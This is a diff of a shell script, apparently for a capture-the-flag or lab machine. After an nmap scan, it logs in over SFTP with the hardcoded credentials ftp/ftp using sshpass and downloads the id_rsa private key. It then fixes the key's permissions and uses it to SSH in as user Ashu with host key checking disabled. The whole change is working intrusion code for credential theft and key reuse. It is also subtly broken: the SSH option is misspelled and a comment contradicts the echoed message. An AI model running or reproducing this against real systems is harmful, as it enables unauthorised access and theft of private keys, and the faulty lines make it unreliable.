@@ -10,10 +10,28 @@ if ! nmap -p 22 --script ssh2-enum-algos "$ip_address"; then
   exit 1
 fi
 
-# Connect to the machine as user Ashu
-echo "Connecting to $ip_address as user Ashu..."
-if ! ssh -o StrictHostKeyChecking=no Ashu@"$ip_address"; then
-  echo "Failed to connect as user Ashu."
+# Connect to the machine as user Ashu and download id_rsa file
+echo "Connecting to $ip_address as user ftp and downloading id_rsa..."
+if ! sshpass -p "ftp" sftp ftp@"$ip_address" << EOF
+  get id_rsa
+  quit
+EOF
+then
+  echo "Failed to connect as user ftp or download id_rsa file."
+  exit 1
+fi
+
+# Change id_rsa permissions to 600
+echo "Changing id_rsa permissions to 600..."
+if ! chmod 600 id_rsa; then
+  echo "Failed to change id_rsa permissions."
+  exit 1
+fi
+
+# Connect to SSH using id_rsa
+echo "Connecting to $ip_address using id_rsa key..."
+if ! ssh -i id_rsa -o StrickHostKeyCHecking=no Ashu@"$ip_address"; then
+  echo "Failed to connect using id_rsa key."
   exit 1
 fi
 
